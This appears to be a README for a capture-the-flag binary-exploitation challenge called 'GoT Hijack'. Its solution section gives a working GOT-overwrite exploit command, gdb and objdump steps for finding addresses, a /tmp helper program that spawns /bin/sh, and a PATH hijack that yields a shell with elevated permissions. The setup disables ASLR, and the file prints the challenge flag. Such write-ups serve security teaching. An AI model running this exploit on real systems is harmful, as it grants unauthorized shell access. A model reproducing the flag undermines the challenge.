# GoT Hijack

In this challenge competitors are provided with an executable binary running on a remote server and they must use the binary to retrieve access to a file that they do not have permission to.

## Solution

The command to exploit this challenge is

    ./GoT AAAAAAAAAAAAAAAAAA`printf "\x10\xa0\x04\x08"` `printf "\x70\x5e\xe6\xf7"`

However the addresses must be updated every time the challenge is moved between machines. Also note that the addresses are little-endian. The first address is the address to printf, which can be found by running

    objdump --dynamic-reloc ./got | grep printf

The second is the address to system, which can be found by running

    gdb GoT
    (gdb) b main
    (gdb) r hello hi
    (gdb) p system

Next, a file will need to be created in the /tmp directory (which can be done automatically with the following commands)

    cat << END_TAG | dd of=/tmp/Calculating.c
    int main()
    {
            system("/bin/sh");
    }
    END_TAG
    gcc -o /tmp/Calculating /tmp/Calculating.c
    chmod +x /tmp/Calculating

The path will need to then be enhanced to include tmp

    export PATH=:/tmp:$PATH

Now the exploit command can be run again and you will be dropped into a shell with new permissions.

## Distribution

To run/set-up the challenge:

    sudo sh -c "echo 'kernel.randomize_va_space=0' >> /etc/sysctl.conf"
    sudo sysctl -p
    sudo docker-compose up -d

    rm ~/.ssh/known_hosts
    ssh challenge@localhost -p2222

Note: ASLR **must** to be disabled on the server this challenge is run on.

## Flag

ce121dcdecf4ce8d015b1cbc2afd8968